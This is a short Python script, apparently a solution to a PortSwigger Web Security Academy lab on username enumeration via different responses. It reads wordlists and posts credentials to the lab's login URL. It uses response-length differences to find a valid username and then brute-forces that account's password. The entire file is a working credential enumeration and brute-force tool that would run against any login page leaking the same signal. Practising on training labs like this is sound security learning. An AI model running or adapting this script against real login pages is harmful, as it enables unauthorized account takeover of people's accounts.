import requests

# Login form URL Lab: Username enumeration via different responses// if you want to test it you must update the Lab's link
url = 'https://0a1b00dc03db066d823bc5cc003b00bb.web-security-academy.net/login'

# Read users from the file usuarios_noborrar.txt
with open('usuarios_noborrar.txt', 'r') as f:
    users = [line.strip() for line in f.readlines()]  

# Read passwords from the file passwords_db.txt
with open('passwords_db.txt', 'r') as f:
    passwords = [line.strip() for line in f.readlines()] 

# request POST
def get_response_data(data):
    response = requests.post(url, data=data)
    return len(response.text), response

prev_length_user = None
correct_user = None

for user in users:
    data = {'username': user, 'password': '123'} 
    response_length, response = get_response_data(data)
    print(f"Testing username: {user} - Length of response: {response_length}")
    
    if prev_length_user is None:
        prev_length_user = response_length  
    elif response_length != prev_length_user:
        print(f"Correct Username found: {user}")
        correct_user = user
        break  # Stops the loop once the correct user has been found

if correct_user is None:
    print("A valid user name was not found.")
else:
    
    prev_length_password = None
    correct_password = None

    for password in passwords:
        data = {'username': correct_user, 'password': password}
        response_length, response = get_response_data(data)
        print(f"Testing password: {password} - Length of response: {response_length}")

        if prev_length_password is None:
            prev_length_password = response_length 
        elif response_length != prev_length_password:
            print(f"Correct password found for {correct_user}: {password}")
            correct_password = password
            break  # Stops the loop once the correct password has been found

    if correct_password is None:
        print("No valid password found.")
